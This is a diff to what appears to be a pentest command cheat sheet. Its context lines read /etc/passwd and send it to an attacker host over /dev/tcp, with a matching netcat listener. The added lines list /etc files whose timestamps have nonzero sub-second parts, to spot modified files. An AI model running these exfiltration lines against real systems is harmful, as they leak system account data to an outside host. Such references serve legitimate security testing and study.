@@ -74,3 +74,11 @@ On attacker machine, `nc -lvnp $LPORT < filename`
 cat /etc/passwd > /dev/tcp/$LHOST/$LPORT
 bash -c "cat /etc/passwd > /dev/tcp/$LHOST/$LPORT"
 ```
+
+# find files that have millisecond microsecond nanosecond times not common install
+files from package managers usually have all 0 for microsecond time in the file system, so files with microsecond times were touched by programs.
+full iso time can be sorted alphabetically, so pipe to sort to sort the results.
+```bash
+find /etc/ -type f -printf "%T+ %p\n" 2>/dev/null | grep -v 0000000000
+find /etc/ -type f -printf "%T+ %p\n" 2>/dev/null | grep -v 0000000000 | sort
+```
